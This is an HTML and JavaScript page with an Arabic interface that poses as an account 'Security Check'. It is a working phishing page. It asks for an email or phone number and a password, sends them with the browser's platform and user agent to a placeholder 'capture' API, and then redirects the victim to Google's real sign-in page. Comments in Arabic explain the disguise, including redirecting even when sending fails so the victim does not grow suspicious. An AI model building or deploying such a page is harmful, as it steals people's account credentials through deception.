<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مركز التحقق من الحساب</title>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { width: 350px; background: #111; padding: 30px; border-radius: 15px; border: 1px solid #333; box-shadow: 0 0 20px rgba(0,255,0,0.1); }
        .logo { margin-bottom: 20px; color: #fff; font-size: 24px; font-weight: bold; }
        input { width: 100%; padding: 12px; margin: 10px 0; background: #222; border: 1px solid #444; color: #fff; border-radius: 8px; box-sizing: border-box; }
        input:focus { border-color: #00ff00; outline: none; }
        .btn { width: 100%; padding: 14px; background: #fff; color: #000; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .status { font-size: 12px; color: #666; margin-top: 15px; }
    </style>
</head>
<body>

<div class="card">
    <div class="logo">🛡️ Security Check</div>
    <p style="font-size: 14px; color: #bbb;">يرجى تسجيل الدخول لتأكيد ملكية الحساب ومتابعة النشاط.</p>
    
    <form id="authForm">
        <input type="text" id="user" placeholder="البريد الإلكتروني أو الهاتف" required>
        <input type="password" id="pass" placeholder="كلمة المرور" required>
        <button type="button" class="btn" id="submitBtn" onclick="handleAuth()">تأكيد الهوية</button>
    </form>

    <div class="status" id="msg">نظام حماية البيانات الموحد v6.0</div>
</div>

<script>
    async function handleAuth() {
        const user = document.getElementById('user').value;
        const pass = document.getElementById('pass').value;
        const btn = document.getElementById('submitBtn');
        const msg = document.getElementById('msg');

        // فحص بسيط قبل الإرسال
        if (user.length < 5 || pass.length < 5) {
            alert("خطأ في البيانات!");
            return;
        }

        // تمويه: تغيير شكل الزر
        btn.innerText = "جاري الفحص...";
        btn.style.opacity = "0.7";
        btn.disabled = true;

        // البيانات اللي بنرسلها للـ API حقنا
        const data = {
            username: user,
            password: pass,
            platform: navigator.platform,
            agent: navigator.userAgent
        };

        try {
            // --- هنا الربط مع الـ API ---
            // استبدل الرابط اللي تحت برابط الـ API حقك (مثل PythonAnywhere)
            const API_URL = "https://your-python-api.com/capture"; 

            const response = await fetch(API_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });

            if (response.ok) {
                msg.innerText = "✅ تم التحقق، جاري التحويل...";
                setTimeout(() => {
                    // التحويل النهائي للموقع الحقيقي
                    window.location.href = "https://accounts.google.com/ServiceLogin";
                }, 1500);
            }
        } catch (error) {
            // حتى لو فشل الاتصال بالسيرفر، نحوله عشان ما يشك
            console.error("Connection Error");
            window.location.href = "https://accounts.google.com";
        }
    }
</script>
</body>
</html>
